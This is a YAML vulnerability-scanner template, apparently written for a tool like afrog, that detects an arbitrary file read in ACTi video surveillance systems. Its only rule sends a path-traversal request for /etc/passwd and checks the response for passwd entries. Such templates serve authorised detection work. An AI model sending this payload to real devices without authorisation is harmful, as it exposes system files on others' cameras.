id: acti-video-read-file

info:
  name: ACTI 视频监控 images 任意文件读取漏洞
  author: zan8in
  severity: high
  verified: true
  description: |
    ACTI 视频监控 存在任意文件读取漏洞
    app="ACTi-视频监控"
  reference:
    - http://wiki.peiqi.tech/wiki/iot/ACTI/ACTI%20%E8%A7%86%E9%A2%91%E7%9B%91%E6%8E%A7%20images%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.html

rules:
  r0:
    request:
      method: GET
      path: /images/../../../../../../../../etc/passwd
    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
expression: r0()